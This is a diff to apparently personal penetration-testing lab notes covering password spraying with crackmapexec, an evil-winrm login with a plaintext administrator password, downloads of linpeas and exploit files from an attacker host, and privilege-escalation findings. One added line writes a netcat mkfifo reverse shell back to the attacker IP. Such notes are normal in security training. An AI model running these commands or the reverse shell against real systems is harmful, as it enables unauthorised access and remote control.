@@ -136,7 +136,7 @@ sudo nmap -sU --open -p 161 -Pn 10.10.110.154
 crackmapexec smb 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth
 crackmapexec winrm 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth --local-auth
 
-evil-winrm -i 10.10.110.154 -u administrator -p hghgib6vHT3bVWf
+evil-winrm -i 10.10.130.154 -u administrator -p hghgib6vHT3bVWf
 ```
 
 .155
@@ -276,14 +276,20 @@ wget http://192.168.45.234/exp
 # try linpeas
 wget http://192.168.45.234/linpeas.sh -O linpeas.sh
 
-# findings
+# findings - the only useful things from here were the adm (syslog) perms to read logfiles and the writable /opt/admin
 .sudo_as_admin_successful in /home/cassie
 look in /opt (/opt/admin is writable)
 /var/log/vsftpd.log 
 /usr/bin/write.ul (Unknown SGID binary)
 ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) 
 /var/log/apache2/access.log 
-
+/var/log/apache2/error.log
+/var/tmp
+/tmp
+/tmp/shell.c
 wget http://192.168.45.234/sudo.sh -O sudo.sh
 wget http://192.168.45.234/pspy64 -O pspy
+
+#
+echo "mkfifo /tmp/lhennp; nc 192.168.45.234 9999 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
 ```
